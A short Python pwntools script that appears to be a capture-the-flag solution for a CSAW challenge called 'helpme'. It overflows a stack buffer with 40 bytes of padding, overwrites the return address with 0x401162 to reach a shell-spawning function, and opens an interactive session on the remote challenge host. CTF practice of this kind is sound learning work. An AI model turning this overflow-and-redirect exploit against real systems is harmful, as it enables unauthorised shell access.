from pwn import *
import sys

REMOTE = True
GDB = False

BINARY = './helpme'

BINSH = 0x401162 


if REMOTE:
    p = remote('pwn.red.csaw.io', 5002)
elif GDB:
    p = gdb.debug(BINARY, 'b main')
else:
    p = process(BINARY)

junk = ("A" * 40).encode()
call = p64(BINSH)

p.recvuntil("Can you do it for me?")
p.sendline(junk + call)
p.interactive()

